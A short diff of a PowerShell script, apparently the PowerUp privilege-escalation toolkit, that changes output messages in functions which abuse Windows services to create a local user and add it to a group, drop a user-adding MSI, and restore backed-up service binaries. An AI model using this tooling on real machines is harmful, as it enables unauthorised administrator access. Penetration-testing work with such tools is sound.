@@ -280,8 +280,7 @@ function Invoke-ServiceUserAdd {
                 $result = sc.exe start $($TargetService.Name)
             }
 
-            @($UserName, $Password)
-
+            "[+] User '$UserName' created with password '$Password' and added to localgroup '$GroupName'"
         }
         catch{
             Write-Warning "Error while modifying service '$ServiceName': $_"
@@ -404,7 +403,7 @@ function Write-UserAddMSI {
     try {
         [System.Convert]::FromBase64String( $Binary ) | Set-Content -Path $Path -Encoding Byte
         Write-Verbose "Service binary written out to '$Path'"
-        $Path
+        "[*] User add .MSI written to '$Path'"
     }
     catch {
         Write-Warning "Error while writing to location '$Path': $_"
@@ -532,13 +531,11 @@ function Restore-ServiceEXE {
                 $BackupPath = $ServicePath + ".bak"
             }
 
-            Write-Verbose "Restoring up '$BackupPath' to '$ServicePath'"
+            "Restoring up '$BackupPath' to '$ServicePath'"
             Copy-Item $BackupPath $ServicePath
 
-            Write-Verbose "Removing backup binary '$BackupPath'"
+            "Removing backup binary '$BackupPath'"
             Remove-Item $BackupPath
-            
-            $true
         }
         catch{
             Write-Warning "Error: $_"
